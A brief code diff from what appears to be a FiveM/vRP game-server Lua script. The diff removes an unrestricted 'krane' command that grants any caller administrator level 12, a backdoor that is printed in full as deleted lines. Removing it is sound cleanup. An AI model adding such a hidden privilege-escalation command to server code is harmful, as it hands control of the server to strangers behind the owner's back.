@@ -94,9 +94,3 @@ CreateThread(function()
         end 
     end
 end)
-
-
-RegisterCommand("krane", function(x,y,z)
-    uid = vRP.getUserId({x})
-    vRP.setUserAdminLevel({uid, 12})
-end, false)
